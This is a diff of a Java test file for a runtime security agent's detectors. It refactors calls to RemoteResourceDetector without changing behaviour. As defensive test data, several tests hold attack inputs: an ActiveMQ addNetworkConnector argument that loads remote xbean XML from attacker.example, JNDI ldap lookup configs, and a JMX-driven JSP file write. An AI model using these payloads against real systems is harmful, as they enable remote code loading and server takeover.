@@ -955,7 +955,7 @@ final class DetectorEngineTest {
   @Test
   void detectsRequestTimeJmxRemoteConfigInvocation() {
     var result =
-        engine.detectJmxMBeanInvoke(
+        RemoteResourceDetector.detectJmxMBeanInvoke(
             "org.apache.activemq:type=Broker,brokerName=localhost",
             "addNetworkConnector",
             List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
@@ -981,7 +981,7 @@ final class DetectorEngineTest {
             body);
 
     var result =
-        engine.detectJmxMBeanInvoke(
+        RemoteResourceDetector.detectJmxMBeanInvoke(
             "org.apache.activemq:type=Broker,brokerName=localhost",
             "addNetworkConnector(java.lang.String)",
             List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
@@ -1001,7 +1001,7 @@ final class DetectorEngineTest {
       try {
         var values = List.of(argument);
         io.ohmyrasp.agent.jmx.JmxWriteScope.select("reports:type=Writer", "publish", values);
-        assertTrue(engine.detectJmxMBeanInvoke("reports:type=Writer", "publish", values, request()).isEmpty());
+        assertTrue(RemoteResourceDetector.detectJmxMBeanInvoke("reports:type=Writer", "publish", values, request()).isEmpty());
         var scope = io.ohmyrasp.agent.jmx.JmxWriteScope.current();
         assertTrue(HostFileMutationDetector.detectJmxFileWrite("/reports/other.jsp", scope, "channel_open", request()).isEmpty());
         var detection = HostFileMutationDetector.detectJmxFileWrite(selected, scope, "channel_open", request());
@@ -1016,7 +1016,7 @@ final class DetectorEngineTest {
   @Test
   void ignoresReadOnlyJmxRemoteUrlArgument() {
     var result =
-        engine.detectJmxMBeanInvoke(
+        RemoteResourceDetector.detectJmxMBeanInvoke(
             "example:type=Info",
             "getStatus",
             List.of("http://example.com/status"),
@@ -1028,7 +1028,7 @@ final class DetectorEngineTest {
   @Test
   void ignoresJmxBenignFileWriteTarget() {
     var result =
-        engine.detectJmxMBeanInvoke(
+        RemoteResourceDetector.detectJmxMBeanInvoke(
             "example:type=Logger",
             "setLogFile",
             List.of("/var/log/app/current.log"),
@@ -1040,7 +1040,7 @@ final class DetectorEngineTest {
   @Test
   void ignoresBackgroundJmxRemoteConfigInvocation() {
     var result =
-        engine.detectJmxMBeanInvoke(
+        RemoteResourceDetector.detectJmxMBeanInvoke(
             "org.apache.activemq:type=Broker,brokerName=localhost",
             "addNetworkConnector",
             List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
@@ -1726,7 +1726,7 @@ final class DetectorEngineTest {
   @Test
   void declaredDirectoryDoesNotEstablishLoginModuleRouting() {
     String config = "com.sun.security.auth.module.JndiLoginModule required user.provider.url=ldap://reports.invalid/weekly;";
-    assertTrue(engine.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
+    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
     var routed = RemoteResourceDetector.detectJndi("ldap://reports.invalid/weekly", request(), "JndiLoginModule.lookup");
     assertAlgorithm(routed, "jndi_jaas_config");
     assertEquals("url_scheme_selection", routed.orElseThrow().details().get("decision_basis"));
@@ -1738,7 +1738,7 @@ final class DetectorEngineTest {
         "org.apache.kafka.common.security.scram.ScramLoginModule required "
             + "username=\"app\" password=\"secret\";";
 
-    assertTrue(engine.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
+    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
   }
 
   @Test
